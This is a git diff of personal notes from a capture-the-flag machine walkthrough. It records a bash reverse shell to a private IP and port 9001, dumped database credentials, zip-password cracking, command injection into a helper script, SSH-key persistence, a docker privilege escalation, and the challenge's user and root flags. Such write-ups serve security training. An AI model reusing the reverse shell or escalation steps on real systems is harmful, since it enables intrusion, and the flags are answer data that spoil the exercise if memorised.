@@ -9,6 +9,24 @@ But only displays id. If you do cli commands, it says are you a hacker?
 and running it. 
 - #!/bin/bash /bin/bash -i >& /dev/tcp/10.4.14.13/9001 0>&1 
 =========
+#Port-9001
+=========
+- Files has its own .php files which is ran at localhost:9001
+- connected to mysql using: mysql -h 127.0.0.1 -u root -p'!@m+her00
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | masterpassword                   |
+|  2 | Apaar     | Dahal    | cullapaar | dontaskdonttell                  |
++----+-----------+----------+-----------+----------------------------------+
+- gives me access to hacker.php that has a stego puzzle
+- using stegseek on the image gives a backup.zip
+- i used zip2john to bruteforce the password of the zipfile
+- zip pass: pass1word = gives source_code.php
+- it contains this if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
+- base64 === !d0ntKn0wmYp@ssw0rd | The user is Anurodh = SSH
+- it requires a random otp to access Authenticate.php
+=========
 #FTP
 =========
 - Has a file called "note.txt"
@@ -23,7 +41,15 @@ and running it.
 =========
 #PrivEsc
 =========
-- I found "Files" located in /var/www/, there's an image. It looks like Stego.
-- hacker.jpg has a backup.zip that is password protected 
-- index.php includes root:!@m+her00+@db
-- port forwarding
+- since the .helpline.sh runs as apaar and processes response as commands
+i typed /bin/bash on $msg and it gave me apaar
+- it doesn't have id_rsa but it has authorized Keys. 
+- I can make my own public key to have persistence on Apaar
+- Anurodh can run docker escape using GTFOBIN Vuln
+=========
+#FLAGS
+=========
+- {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
+- {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
+
+
